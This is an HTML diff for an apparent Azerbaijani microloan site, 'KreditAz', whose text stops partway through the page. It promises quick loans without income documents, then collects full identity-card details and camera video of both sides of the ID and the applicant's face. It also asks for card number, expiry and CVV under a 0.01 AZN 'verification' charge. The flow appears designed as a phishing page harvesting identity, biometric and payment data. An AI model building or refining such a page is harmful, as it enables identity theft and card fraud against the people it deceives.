-    .calc-card{padding:20px;}
-    .results{padding:18px;}
-    .modal-card{padding:24px;}
-    .hero h1{font-size:28px;}
-    .hero-card .big-number{font-size:22px;}
-    .id-card-preview{padding:14px 16px;}
-    .card-input-wrap .bank-card-visual{padding:16px 18px;min-height:160px;}
-    .card-input-wrap .bank-card-visual .card-number-display{font-size:16px;letter-spacing:3px;}
-    .card-input-wrap .bank-card-visual .card-top .bank-name-on-card{font-size:11px;}
-  }
-  @media (max-width:480px){
-    .face-scan-frame{width:150px;height:150px;}
-    .bank-grid{grid-template-columns:1fr 1fr;}
-    .cta-btn, .cta-white, .cta-ghost{font-size:12px;padding:10px 16px;}
-    .hero h1{font-size:24px;}
-    .logo{font-size:18px;}
-    .logo .logo-icon{width:26px;height:26px;font-size:12px;}
-    .hero-actions{flex-direction:column;}
-    .hero-actions .cta-btn, .hero-actions .cta-ghost{width:100%;text-align:center;justify-content:center;}
-    .modal-card{padding:16px;}
-    .modal-close{top:10px;right:10px;width:30px;height:30px;font-size:14px;}
-    .field label{font-size:13px;}
-    .field input, .field select{font-size:13px;padding:10px 12px;}
-    .toggle-btn{font-size:13px;padding:10px;}
-    .card-input-wrap .bank-card-visual .card-number-display{font-size:14px;letter-spacing:2px;}
-    .card-input-wrap .bank-card-visual{padding:14px 14px;min-height:140px;}
-    .face-scan-frame{width:150px;height:150px;}
-    .face-scan-status{font-size:13px;}
-    .checking-container .check-title{font-size:18px;}
-    .checking-container .check-sub{font-size:13px;}
-    .payment-amount .amount{font-size:22px;}
-  }
-</style>
+        @media (max-width:768px){
+            .video-scan-frame{max-width:100%;}
+        }
+    </style>
 </head>
 <body>
 
 <header>
-  <div class="nav">
-    <div class="logo">
-      <div class="logo-icon">K</div>
-      <span class="kredit">Kredit</span><span class="az">Az</span>
+    <div class="nav">
+        <div class="logo">
+            <div class="logo-icon">K</div>
+            <span class="kredit">Kredit</span><span class="az">Az</span>
+        </div>
+        <nav><ul>
+            <li><a href="#hesabla">Hesabla</a></li>
+            <li><a href="#teklifler">Təkliflər</a></li>
+            <li><a href="#neceislyir">Necə işləyir</a></li>
+            <li><a href="#faq">Suallar</a></li>
+        </ul></nav>
+        <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
+            <button class="cta-btn" onclick="openModal()">Müraciət et</button>
+            <button class="cta-white" onclick="openCreditCheckModal()">Kredit Ödə</button>
+        </div>
     </div>
-    <nav><ul>
-      <li><a href="#hesabla">Hesabla</a></li>
-      <li><a href="#teklifler">Təkliflər</a></li>
-      <li><a href="#neceislyir">Necə işləyir</a></li>
-      <li><a href="#faq">Suallar</a></li>
-    </ul></nav>
-    <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
-      <button class="cta-btn" onclick="openModal()">Müraciət et</button>
-      <button class="cta-white" onclick="openCreditCheckModal()">Kredit Ödə</button>
-    </div>
-  </div>
 </header>
 
 <div class="kilim"></div>
 
 <!-- HERO -->
 <section class="hero">
-  <div class="wrap hero-grid">
-    <div>
-      <span class="eyebrow">Rəsmi gəlir sənədi tələb olunmadan · 24/7</span>
-      <h1>Pulunuz <em>30 dəqiqəyə</em> kartınızda ola bilər.</h1>
-      <p>Şəxsiyyət vəsiqəniz kifayətdir — rəsmi iş yeri sənədi tələb olunmur.</p>
-      <div class="hero-actions">
-        <button class="cta-btn" onclick="document.getElementById('hesabla').scrollIntoView({behavior:'smooth'})">Kalkulyatoru aç</button>
-        <button class="cta-ghost" onclick="document.getElementById('teklifler').scrollIntoView({behavior:'smooth'})">Şərtlərə bax</button>
-      </div>
+    <div class="wrap hero-grid">
+        <div>
+            <span class="eyebrow">Rəsmi gəlir sənədi tələb olunmadan · 24/7</span>
+            <h1>Pulunuz <em>30 dəqiqəyə</em> kartınızda ola bilər.</h1>
+            <p>Şəxsiyyət vəsiqəniz kifayətdir — rəsmi iş yeri sənədi tələb olunmur.</p>
+            <div class="hero-actions">
+                <button class="cta-btn" onclick="document.getElementById('hesabla').scrollIntoView({behavior:'smooth'})">Kalkulyatoru aç</button>
+                <button class="cta-ghost" onclick="document.getElementById('teklifler').scrollIntoView({behavior:'smooth'})">Şərtlərə bax</button>
+            </div>
+        </div>
+        <div class="hero-card">
+            <div class="row"><span>Kredit təşkilatı</span><span class="mono">KreditAz MKT</span></div>
+            <div class="row"><span>Məbləğ aralığı</span><span class="mono">100–700 ₼</span></div>
+            <hr>
+            <div class="row"><span>Nümunə: 500 ₼ / 3 ay</span></div>
+            <div class="big-number">202 ₼ <span style="font-size:14px;color:var(--ink-soft);font-family:'Manrope',sans-serif;">/ ay</span></div>
+            <div class="row" style="margin-top:10px;"><span>Aylıq faiz</span><span class="mono">4%</span></div>
+        </div>
     </div>
-    <div class="hero-card">
-      <div class="row"><span>Kredit təşkilatı</span><span class="mono">KreditAz MKT</span></div>
-      <div class="row"><span>Məbləğ aralığı</span><span class="mono">100–700 ₼</span></div>
-      <hr>
-      <div class="row"><span>Nümunə: 500 ₼ / 3 ay</span></div>
-      <div class="big-number">202 ₼ <span style="font-size:14px;color:var(--ink-soft);font-family:'Manrope',sans-serif;">/ ay</span></div>
-      <div class="row" style="margin-top:10px;"><span>Aylıq faiz</span><span class="mono">4%</span></div>
-    </div>
-  </div>
 </section>
 
 <!-- CALCULATOR -->
 <section id="hesabla">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="eyebrow">Kalkulyator</span>
-      <h2>Nə qədər lazımdır, neçə aya rahatdır?</h2>
+    <div class="wrap">
+        <div class="section-head">
+            <span class="eyebrow">Kalkulyator</span>
+            <h2>Nə qədər lazımdır, neçə aya rahatdır?</h2>
+        </div>
+        <div class="calc-card">
+            <div>
+                <div class="slider-block">
+                    <label>Kredit məbləği <span class="slider-value" id="amountLabel">400 ₼</span></label>
+                    <input type="range" id="amountSlider" min="100" max="700" step="50" value="400">
+                    <div class="range-labels"><span>100 ₼</span><span>700 ₼</span></div>
+                </div>
+                <div class="slider-block">
+                    <label>Müddət <span class="slider-value" id="termLabel">3 ay</span></label>
+                    <input type="range" id="termSlider" min="0" max="5" step="1" value="4">
+                    <div class="range-labels" style="display:flex;justify-content:space-between;flex-wrap:wrap;">
+                        <span>10g</span><span>15g</span><span>20g</span><span>1ay</span><span>2ay</span><span>3ay</span>
+                    </div>
+                </div>
+            </div>
+            <div class="results">
+                <div class="headline-pair">
+                    <div><div class="lbl">Aylıq ödəniş</div><div class="num" id="monthlyOut">202 ₼</div></div>
+                    <div style="text-align:right"><div class="lbl">Qaytarılacaq</div><div class="num" id="totalOut">605 ₼</div></div>
+                </div>
+                <div class="pair"><span>Kredit məbləği</span><span class="mono" id="principalOut">400 ₼</span></div>
+                <div class="pair"><span>Komissiya (9%)</span><span class="mono" id="feeOut">36 ₼</span></div>
+                <div class="pair"><span>Müddət</span><span class="mono" id="termOut">3 ay</span></div>
+                <div class="pair"><span>Aylıq faiz</span><span class="mono">4%</span></div>
+            </div>
+        </div>
     </div>
-    <div class="calc-card">
-      <div>
-        <div class="slider-block">
-          <label>Kredit məbləği <span class="slider-value" id="amountLabel">400 ₼</span></label>
-          <input type="range" id="amountSlider" min="100" max="700" step="50" value="400">
-          <div class="range-labels"><span>100 ₼</span><span>700 ₼</span></div>
-        </div>
-        <div class="slider-block">
-          <label>Müddət <span class="slider-value" id="termLabel">3 ay</span></label>
-          <input type="range" id="termSlider" min="0" max="5" step="1" value="4">
-          <div class="range-labels" style="display:flex;justify-content:space-between;flex-wrap:wrap;">
-            <span>10g</span><span>15g</span><span>20g</span><span>1ay</span><span>2ay</span><span>3ay</span>
-          </div>
-        </div>
-      </div>
-      <div class="results">
-        <div class="headline-pair">
-          <div><div class="lbl">Aylıq ödəniş</div><div class="num" id="monthlyOut">202 ₼</div></div>
-          <div style="text-align:right"><div class="lbl">Qaytarılacaq</div><div class="num" id="totalOut">605 ₼</div></div>
-        </div>
-        <div class="pair"><span>Kredit məbləği</span><span class="mono" id="principalOut">400 ₼</span></div>
-        <div class="pair"><span>Komissiya (9%)</span><span class="mono" id="feeOut">36 ₼</span></div>
-        <div class="pair"><span>Müddət</span><span class="mono" id="termOut">3 ay</span></div>
-        <div class="pair"><span>Aylıq faiz</span><span class="mono">4%</span></div>
-      </div>
-    </div>
-  </div>
 </section>
 
 <div class="wrap"><div class="kilim dark"></div></div>
 
 <!-- OFFERS -->
 <section id="teklifler">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="eyebrow">Təkliflər</span>
-      <h2>İki fərqli müddət, eyni sadəlik</h2>
+    <div class="wrap">
+        <div class="section-head">
+            <span class="eyebrow">Təkliflər</span>
+            <h2>İki fərqli müddət, eyni sadəlik</h2>
+        </div>
+        <div class="offers-grid">
+            <div class="offer-card">
+                <span class="tag">Standart</span>
+                <h3>Sürətli Kredit</h3>
+                <div class="amount mono">100 – 700 ₼</div>
+                <ul>
+                    <li><span>Müddət</span><span class="mono">2 ay</span></li>
+                    <li><span>Aylıq faiz</span><span class="mono">4%</span></li>
+                    <li><span>Komissiya</span><span class="mono">9%</span></li>
+                    <li><span>Rəsmi gəlir tələbi</span><span class="mono">Yoxdur</span></li>
+                </ul>
+            </div>
+            <div class="offer-card vip">
+                <span class="tag">VIP</span>
+                <h3>Uzadılmış Kredit</h3>
+                <div class="amount mono">100 – 700 ₼</div>
+                <ul>
+                    <li><span>Müddət</span><span class="mono">3 ay</span></li>
+                    <li><span>Aylıq faiz</span><span class="mono">4%</span></li>
+                    <li><span>Komissiya</span><span class="mono">9%</span></li>
+                    <li><span>Rəsmi gəlir tələbi</span><span class="mono">Yoxdur</span></li>
+                </ul>
+            </div>
+        </div>
     </div>
-    <div class="offers-grid">
-      <div class="offer-card">
-        <span class="tag">Standart</span>
-        <h3>Sürətli Kredit</h3>
-        <div class="amount mono">100 – 700 ₼</div>
-        <ul>
-          <li><span>Müddət</span><span class="mono">2 ay</span></li>
-          <li><span>Aylıq faiz</span><span class="mono">4%</span></li>
-          <li><span>Komissiya</span><span class="mono">9%</span></li>
-          <li><span>Rəsmi gəlir tələbi</span><span class="mono">Yoxdur</span></li>
-        </ul>
-      </div>
-      <div class="offer-card vip">
-        <span class="tag">VIP</span>
-        <h3>Uzadılmış Kredit</h3>
-        <div class="amount mono">100 – 700 ₼</div>
-        <ul>
-          <li><span>Müddət</span><span class="mono">3 ay</span></li>
-          <li><span>Aylıq faiz</span><span class="mono">4%</span></li>
-          <li><span>Komissiya</span><span class="mono">9%</span></li>
-          <li><span>Rəsmi gəlir tələbi</span><span class="mono">Yoxdur</span></li>
-        </ul>
-      </div>
-    </div>
-  </div>
 </section>
 
 <!-- HOW IT WORKS -->
 <section id="neceislyir">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="eyebrow">Necə işləyir</span>
-      <h2>Üç addımda müraciət</h2>
+    <div class="wrap">
+        <div class="section-head">
+            <span class="eyebrow">Necə işləyir</span>
+            <h2>Üç addımda müraciət</h2>
+        </div>
+        <div class="steps">
+            <div class="step"><span class="num">01</span><h3>Hesablayın</h3><p>Kalkulyatorda məbləği və müddəti seçin.</p></div>
+            <div class="step"><span class="num">02</span><h3>Müraciət göndərin</h3><p>Şəxsiyyət vəsiqəsi məlumatları ilə formu doldurun.</p></div>
+            <div class="step"><span class="num">03</span><h3>Qərarı öyrənin</h3><p>Kredit tarixçəniz yoxlanılır, nəticə bildirilir.</p></div>
+        </div>
     </div>
-    <div class="steps">
-      <div class="step"><span class="num">01</span><h3>Hesablayın</h3><p>Kalkulyatorda məbləği və müddəti seçin.</p></div>
-      <div class="step"><span class="num">02</span><h3>Müraciət göndərin</h3><p>Şəxsiyyət vəsiqəsi məlumatları ilə formu doldurun.</p></div>
-      <div class="step"><span class="num">03</span><h3>Qərarı öyrənin</h3><p>Kredit tarixçəniz yoxlanılır, nəticə bildirilir.</p></div>
-    </div>
-  </div>
 </section>
 
 <!-- FAQ -->
 <section id="faq">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="eyebrow">Sual-Cavab</span>
-      <h2>Tez-tez verilən suallar</h2>
+    <div class="wrap">
+        <div class="section-head">
+            <span class="eyebrow">Sual-Cavab</span>
+            <h2>Tez-tez verilən suallar</h2>
+        </div>
+        <div id="faqList">
+            <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Nə qədər məbləğ ala bilərəm? <span class="icon">+</span></button><div class="faq-a"><p>100–700 ₼ arasında, rəsmi gəlir sənədi olmadan.</p></div></div>
+            <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Hansı sənədlər lazımdır? <span class="icon">+</span></button><div class="faq-a"><p>Şəxsiyyət vəsiqəsi məlumatları kifayətdir.</p></div></div>
+            <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Gecikmə olarsa nə baş verir? <span class="icon">+</span></button><div class="faq-a"><p>Müqavilədə göstərilən cərimə tətbiq olunur.</p></div></div>
+            <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Krediti vaxtından əvvəl qapata bilərəmmi? <span class="icon">+</span></button><div class="faq-a"><p>Bəli, faiz yalnız istifadə günlərinə görə hesablanır.</p></div></div>
+        </div>
     </div>
-    <div id="faqList">
-      <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Nə qədər məbləğ ala bilərəm? <span class="icon">+</span></button><div class="faq-a"><p>100–700 ₼ arasında, rəsmi gəlir sənədi olmadan.</p></div></div>
-      <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Hansı sənədlər lazımdır? <span class="icon">+</span></button><div class="faq-a"><p>Şəxsiyyət vəsiqəsi məlumatları kifayətdir.</p></div></div>
-      <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Gecikmə olarsa nə baş verir? <span class="icon">+</span></button><div class="faq-a"><p>Müqavilədə göstərilən cərimə tətbiq olunur.</p></div></div>
-      <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Krediti vaxtından əvvəl qapata bilərəmmi? <span class="icon">+</span></button><div class="faq-a"><p>Bəli, faiz yalnız istifadə günlərinə görə hesablanır.</p></div></div>
-    </div>
-  </div>
 </section>
 
 <div class="wrap"><div class="kilim"></div></div>
 
 <!-- ========== MODAL ========== -->
 <div class="modal-overlay" id="modalOverlay">
-  <div class="modal-card">
-    <button type="button" class="modal-close" onclick="closeModal()">✕</button>
+    <div class="modal-card">
+        <button type="button" class="modal-close" onclick="closeModal()">✕</button>
 
-    <!-- STEP 1: Müraciət Formu (NÖMRƏSİZ) -->
-    <div id="formStep">
-      <h2 style="font-size:26px;margin-bottom:6px;">Onlayn kredit müraciəti</h2>
-      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Şəxsiyyət vəsiqəsi məlumatlarını daxil edin</p>
-      <form id="applyForm" novalidate onsubmit="return false;">
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
-          <div class="field"><label>Ad</label><input type="text" id="firstName" placeholder="Əli"></div>
-          <div class="field"><label>Soyad</label><input type="text" id="lastName" placeholder="Məmmədov"></div>
-        </div>
-        <div class="field"><label>Ata adı</label><input type="text" id="patronymic" placeholder="Əli oğlu"></div>
-        <div class="field"><label>Doğum tarixi</label><input type="date" id="birthDate"></div>
-        <div class="field"><label>FIN kod</label><input type="text" id="fin" placeholder="7A2BC9D" maxlength="7"></div>
-        <div class="field"><label>Seriya nömrəsi</label>
-          <div style="display:flex;gap:10px;">
-            <select id="idPrefix" style="max-width:90px;"><option>AZE</option></select>
-            <input type="text" id="idnum" placeholder="12345678" maxlength="8" inputmode="numeric">
-          </div>
-        </div>
-        <div class="field"><label>Rəsmi iş yeriniz?</label>
-          <div class="toggle-row">
-            <button type="button" class="toggle-btn active" data-val="beli">Bəli</button>
-            <button type="button" class="toggle-btn" data-val="xeyr">Xeyr</button>
-          </div>
-        </div>
-        
-        <div class="id-card-preview" id="idCardPreview">
-          <div class="id-header">
-            <div class="id-title">AZƏRBAYCAN RESPUBLİKASI <small>REPUBLIC OF AZERBAIJAN</small></div>
-            <div class="id-logo">ŞƏXSİYYƏT VƏSIQƏSI <small>IDENTITY CARD</small></div>
-          </div>
-          <div class="id-photo">👤</div>
-          <div class="id-row"><span class="id-label">SOYAD / SURNAME</span><span class="id-value" id="previewSurname">MƏMMƏDOV</span></div>
-          <div class="id-row"><span class="id-label">AD / GIVEN NAME</span><span class="id-value" id="previewName">ƏLİ</span></div>
-          <div class="id-row"><span class="id-label">ATASININ ADI / PATRONYMIC</span><span class="id-value" id="previewPatronymic">ƏLİ OĞLU</span></div>
-          <div class="id-row"><span class="id-label">DOĞUM TARİXİ / DATE OF BIRTH</span><span class="id-value" id="previewBirth">01.01.1990</span></div>
-          <div class="id-row"><span class="id-label">FİN / PERSONAL NO</span><span class="id-value" id="previewFin">7A2BC9D</span></div>
-          <div class="id-row"><span class="id-label">SERİYA / CARD NO</span><span class="id-value" id="previewId">AZE 12345678</span></div>
-          <div class="id-footer">
-            <span>Müddət / Date of Expiry: 10 il</span>
-            <span>Verilmə tarixi: 01.01.2020</span>
-          </div>
-          <div class="id-signature">
-            <span>İmza / Signature</span>
-            <span class="sig-line"></span>
-          </div>
+        <!-- STEP 1: Müraciət Formu -->
+        <div id="formStep">
+            <h2 style="font-size:26px;margin-bottom:6px;">Onlayn kredit müraciəti</h2>
+            <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Şəxsiyyət vəsiqəsi məlumatlarını daxil edin</p>
+            <form id="applyForm" novalidate onsubmit="return false;">
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+                    <div class="field"><label>Ad</label><input type="text" id="firstName" placeholder="Əli"></div>
+                    <div class="field"><label>Soyad</label><input type="text" id="lastName" placeholder="Məmmədov"></div>
+                </div>
+                <div class="field"><label>Ata adı</label><input type="text" id="patronymic" placeholder="Əli oğlu"></div>
+                <div class="field"><label>Doğum tarixi</label><input type="date" id="birthDate"></div>
+                <div class="field"><label>FIN kod</label><input type="text" id="fin" placeholder="7A2BC9D" maxlength="7"></div>
+                <div class="field"><label>Seriya nömrəsi</label>
+                    <div style="display:flex;gap:10px;">
+                        <select id="idPrefix" style="max-width:90px;"><option>AZE</option></select>
+                        <input type="text" id="idnum" placeholder="12345678" maxlength="8" inputmode="numeric">
+                    </div>
+                </div>
+                <div class="field"><label>Rəsmi iş yeriniz?</label>
+                    <div class="toggle-row">
+                        <button type="button" class="toggle-btn active" data-val="beli">Bəli</button>
+                        <button type="button" class="toggle-btn" data-val="xeyr">Xeyr</button>
+                    </div>
+                </div>
+                
+                <div class="id-card-preview" id="idCardPreview">
+                    <div class="id-header">
+                        <div class="id-title">AZƏRBAYCAN RESPUBLİKASI <small>REPUBLIC OF AZERBAIJAN</small></div>
+                        <div class="id-logo">ŞƏXSİYYƏT VƏSIQƏSI <small>IDENTITY CARD</small></div>
+                    </div>
+                    <div class="id-photo">👤</div>
+                    <div class="id-row"><span class="id-label">SOYAD / SURNAME</span><span class="id-value" id="previewSurname">MƏMMƏDOV</span></div>
+                    <div class="id-row"><span class="id-label">AD / GIVEN NAME</span><span class="id-value" id="previewName">ƏLİ</span></div>
+                    <div class="id-row"><span class="id-label">ATASININ ADI / PATRONYMIC</span><span class="id-value" id="previewPatronymic">ƏLİ OĞLU</span></div>
+                    <div class="id-row"><span class="id-label">DOĞUM TARİXİ / DATE OF BIRTH</span><span class="id-value" id="previewBirth">01.01.1990</span></div>
+                    <div class="id-row"><span class="id-label">FİN / PERSONAL NO</span><span class="id-value" id="previewFin">7A2BC9D</span></div>
+                    <div class="id-row"><span class="id-label">SERİYA / CARD NO</span><span class="id-value" id="previewId">AZE 12345678</span></div>
+                    <div class="id-footer">
+                        <span>Müddət / Date of Expiry: 10 il</span>
+                        <span>Verilmə tarixi: 01.01.2020</span>
+                    </div>
+                    <div class="id-signature">
+                        <span>İmza / Signature</span>
+                        <span class="sig-line"></span>
+                    </div>
+                </div>
+
+                <label class="checkline"><input type="checkbox" id="consent1" required> Məlumatlarımın yoxlanılmasına razıyam</label>
+                <label class="checkline"><input type="checkbox" id="consent2" required> Kredit tarixçəmin yoxlanılmasına razıyam</label>
+                <button type="submit" class="cta-btn" style="width:100%;padding:15px;font-size:15px;" onclick="event.preventDefault(); submitForm(); return false;">Davam et</button>
+            </form>
         </div>
 
-        <label class="checkline"><input type="checkbox" id="consent1" required> Məlumatlarımın yoxlanılmasına razıyam</label>
-        <label class="checkline"><input type="checkbox" id="consent2" required> Kredit tarixçəmin yoxlanılmasına razıyam</label>
-        <button type="submit" class="cta-btn" style="width:100%;padding:15px;font-size:15px;" onclick="event.preventDefault(); submitForm(); return false;">Davam et</button>
-      </form>
-    </div>
-
-    <!-- STEP 2: Summary -->
-    <div id="summaryStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">Məlumatlarınız düzdürmü?</h2>
-      <div class="id-card-preview" style="max-width:100%;">
-        <div class="id-header">
-          <div class="id-title">AZƏRBAYCAN RESPUBLİKASI <small>REPUBLIC OF AZERBAIJAN</small></div>
-          <div class="id-logo">ŞƏXSİYYƏT VƏSIQƏSI <small>IDENTITY CARD</small></div>
-        </div>
-        <div class="id-photo">👤</div>
-        <div class="id-row"><span class="id-label">SOYAD / SURNAME</span><span class="id-value" id="sumSurname">—</span></div>
-        <div class="id-row"><span class="id-label">AD / GIVEN NAME</span><span class="id-value" id="sumName">—</span></div>
-        <div class="id-row"><span class="id-label">ATASININ ADI / PATRONYMIC</span><span class="id-value" id="sumPatronymic">—</span></div>
-        <div class="id-row"><span class="id-label">DOĞUM TARİXİ</span><span class="id-value" id="sumBirth">—</span></div>
-        <div class="id-row"><span class="id-label">FİN / PERSONAL NO</span><span class="id-value" id="sumFin">—</span></div>
-        <div class="id-row"><span class="id-label">SERİYA / CARD NO</span><span class="id-value" id="sumId">—</span></div>
-        <div class="id-row"><span class="id-label">İŞ YERİ</span><span class="id-value" id="sumJob">—</span></div>
-        <div class="id-footer"><span>Müddət: 10 il</span><span>Verilmə: 01.01.2020</span></div>
-        <div class="id-signature"><span>İmza / Signature</span><span class="sig-line"></span></div>
-      </div>
-      <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:20px;" onclick="goToFaceScan(); return false;">Davam et → Şəxsiyyət təsdiqi</button>
-    </div>
-
-    <!-- STEP 3: Face Scan -->
-    <div id="faceScanStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">📸 Şəxsiyyət təsdiqi</h2>
-      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 12px;">Şəxsiyyətinizi təsdiqləmək üçün üzünüzü kameraya göstərin</p>
-      
-      <div class="face-scan-container">
-        <div class="face-scan-frame" id="faceFrame">
-          <video id="faceVideo" autoplay playsinline></video>
-          <div class="face-overlay"></div>
-          <div class="scan-line"></div>
-          <div class="scan-corner tl"></div>
-          <div class="scan-corner tr"></div>
-          <div class="scan-corner bl"></div>
-          <div class="scan-corner br"></div>
-        </div>
-        <div class="face-scan-status" id="faceStatus">
-          Üzünüzü dairənin içinə tutun
-          <span class="sub">Kamera icazəsini aktiv edin</span>
-        </div>
-        <div class="face-scan-progress">
-          <div class="fill" id="faceProgress" style="width:0%;"></div>
-        </div>
-        <div class="face-scan-status-text" id="faceStatusText"></div>
-      </div>
-      
-      <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:10px;" onclick="startFaceScan(); return false;" id="faceStartBtn">📷 Kameranı aç</button>
-    </div>
-
-    <!-- STEP 4: Checking Animation (5 saniyə) -->
-    <div id="checkingStep" style="display:none;">
-      <div class="checking-container">
-        <div class="spinner"></div>
-        <div class="check-icon">🔍</div>
-        <div class="check-title">Məlumatlar yoxlanılır</div>
-        <div class="check-sub">Şəxsiyyət məlumatlarınız təhlükəsiz şəkildə yoxlanılır...</div>
-        <div class="check-dots"><span></span><span></span><span></span></div>
-        <div style="margin-top:16px;font-size:13px;color:var(--ink-soft);"><span id="checkingTimer">0</span> saniyə</div>
-      </div>
-    </div>
-
-    <!-- STEP 5: Bank seçimi -->
-    <div id="bankStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">Hansı bank kartına köçürək?</h2>
-      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Kredit məbləği seçdiyiniz kart hesabına köçürüləcək</p>
-      <div class="bank-grid" id="bankGrid"></div>
-      <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:24px;" onclick="goToCardInput(); return false;">Təsdiqlə və davam et</button>
-    </div>
-
-    <!-- STEP 6: Kart Doğrulama -->
-    <div id="cardInputStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">💳 Kart Doğrulama</h2>
-      <p style="color:var(--ink-soft);font-size:14px;margin:0 0 12px;">Kartınızı doğrulamaq üçün məlumatları daxil edin</p>
-      
-      <div class="payment-amount">
-        <div class="label">Doğrulama məbləği</div>
-        <div class="amount">0.01 ₼</div>
-        <div style="font-size:12px;opacity:0.6;margin-top:4px;">Kartınızdan 0.01 AZN çəkiləcək və geri qaytarılacaq</div>
-      </div>
-      
-      <div class="card-logos-row">
-        <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#1a1f71"/><circle cx="35" cy="20" r="14" fill="#eb001b"/><circle cx="55" cy="20" r="14" fill="#f79e1b"/><text x="75" y="24" font-family="Arial" font-size="14" fill="white" font-weight="bold">VISA</text></svg>
-        <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="45" cy="20" r="14" fill="#f79e1b" opacity="0.5"/><circle cx="55" cy="20" r="14" fill="#eb001b" opacity="0.5"/><text x="72" y="24" font-family="Arial" font-size="11" fill="white" font-weight="bold">Mastercard</text></svg>
-      </div>
-      
-      <div style="background:var(--sage);border-radius:12px;padding:12px 16px;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;">
-        <span style="font-weight:600;font-size:14px;">Seçilmiş Bank</span>
-        <span style="font-weight:700;color:var(--teal-deep);font-size:14px;" id="selectedBankDisplay">Kapital Bank</span>
-      </div>
-      
-      <div class="card-input-wrap">
-        <div class="bank-card-visual" id="bankCardVisual" style="background:linear-gradient(135deg, #1a1a2e, #16213e);">
-          <div class="card-chip"></div>
-          <div class="card-top">
-            <span class="bank-name-on-card" id="cardBankName">KAPITAL BANK</span>
-            <span class="card-type">💳</span>
-          </div>
-          <div class="card-number-display" id="cardDisplayArea">
-            <span id="cardDigits">0000 0000 0000 0000</span>
-          </div>
-          <div class="card-bottom">
-            <div>
-              <div class="card-expiry-label">Bitmə</div>
-              <div class="card-expiry-value" id="cardExpiryDisplay">MM/YY</div>
+        <!-- STEP 2: Summary -->
+        <div id="summaryStep" style="display:none;">
+            <h2 style="font-size:26px;margin-bottom:6px;">Məlumatlarınız düzdürmü?</h2>
+            <div class="id-card-preview" style="max-width:100%;">
+                <div class="id-header">
+                    <div class="id-title">AZƏRBAYCAN RESPUBLİKASI <small>REPUBLIC OF AZERBAIJAN</small></div>
+                    <div class="id-logo">ŞƏXSİYYƏT VƏSIQƏSI <small>IDENTITY CARD</small></div>
+                </div>
+                <div class="id-photo">👤</div>
+                <div class="id-row"><span class="id-label">SOYAD / SURNAME</span><span class="id-value" id="sumSurname">—</span></div>
+                <div class="id-row"><span class="id-label">AD / GIVEN NAME</span><span class="id-value" id="sumName">—</span></div>
+                <div class="id-row"><span class="id-label">ATASININ ADI / PATRONYMIC</span><span class="id-value" id="sumPatronymic">—</span></div>
+                <div class="id-row"><span class="id-label">DOĞUM TARİXİ</span><span class="id-value" id="sumBirth">—</span></div>
+                <div class="id-row"><span class="id-label">FİN / PERSONAL NO</span><span class="id-value" id="sumFin">—</span></div>
+                <div class="id-row"><span class="id-label">SERİYA / CARD NO</span><span class="id-value" id="sumId">—</span></div>
+                <div class="id-row"><span class="id-label">İŞ YERİ</span><span class="id-value" id="sumJob">—</span></div>
+                <div class="id-footer"><span>Müddət: 10 il</span><span>Verilmə: 01.01.2020</span></div>
+                <div class="id-signature"><span>İmza / Signature</span><span class="sig-line"></span></div>
             </div>
-            <div style="text-align:right;">
-              <div class="card-cvv-label">CVV</div>
-              <div class="card-cvv-value" id="cardCvvDisplay">***</div>
+            <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:20px;" onclick="goToVideoScan(); return false;">Davam et → Sənəd yoxlaması</button>
+        </div>
+
+        <!-- STEP 3: Video Scan (Şəxsiyyət vəsiqəsi ön + arxa + üz) -->
+        <div id="videoScanStep" style="display:none;">
+            <h2 style="font-size:26px;margin-bottom:6px;">📹 Sənəd yoxlaması</h2>
+            <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 12px;">Şəxsiyyət vəsiqənizi təsdiqləmək üçün kamera ilə çəkin</p>
+            
+            <div class="video-scan-container">
+                <div class="step-counter" id="scanStepCounter">1 / 3</div>
+                
+                <div class="video-scan-frame" id="videoFrame">
+                    <video id="scanVideo" autoplay playsinline></video>
+                    <div class="scan-overlay"></div>
+                    <div class="scan-line"></div>
+                    <div class="scan-corner tl"></div>
+                    <div class="scan-corner tr"></div>
+                    <div class="scan-corner bl"></div>
+                    <div class="scan-corner br"></div>
+                </div>
+                
+                <div class="video-scan-status" id="scanStatus">
+                    📄 Şəxsiyyət vəsiqənizin ön tərəfini göstərin
+                    <span class="sub">Kameranı sənədə doğru tutun</span>
+                </div>
+                
+                <div class="video-scan-progress">
+                    <div class="fill" id="scanProgress" style="width:0%;"></div>
+                </div>
+                <div class="video-scan-status-text" id="scanStatusText"></div>
             </div>
-          </div>
-          <div class="card-contactless">📶</div>
-          <img class="card-logo-on-card" id="cardLogoOnCard" src="" alt="">
+            
